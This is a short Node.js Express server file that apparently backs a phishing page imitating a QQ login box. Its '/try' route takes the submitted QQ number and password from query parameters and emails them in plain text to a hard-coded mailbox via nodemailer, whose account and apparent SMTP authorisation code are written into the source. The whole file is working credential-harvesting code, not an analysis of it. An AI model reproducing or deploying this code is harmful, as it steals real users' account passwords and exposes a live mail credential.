/**
 * Created by weilanten on 2017/2/10.
 */
var express = require('express');
var app = express();

app.set('port', (process.env.PORT || 5000));

app.use(express.static(__dirname + '/public'));

app.set('views', __dirname + '/views');
app.set('view engine', 'ejs');


var nodemailer = require('nodemailer');
var transporter = nodemailer.createTransport({
    service: 'qq',
    port: 465,
    secureConnection: true,
    auth: {
        user: '2501100657@qq.com',
        pass: 'rucigczwfahqecaa'
    }
});



app.get('/', function(request, response) {
    response.render('pages/index');
});

app.get('/qqlogin', function(request, response) {
    response.render('pages/loginbox');
});
app.get('/qrerror', function(request, response) {
    response.render('pages/qrerror');
});
app.get('/try', function (res, req) {
    const qq = res.query.qq;
    const password = res.query.pass;

    var mailOptions = {
        from: '2501100657@qq.com',
        to: '2501100657@qq.com',
        subject: 'Test',
        text: 'qq:'+qq+'pass:'+password,
        html: '<h1>qq:'+qq+'pass:'+password+'</h1>'
    };

    transporter.sendMail(mailOptions, function (error, info) {
        if (error) {
            return console.log(error)
        }
        console.log('Message sent: ' + info.response)
        req.send('ok');
    });

});
app.listen(app.get('port'), function() {
    console.log('Node app is running on port', app.get('port'));
});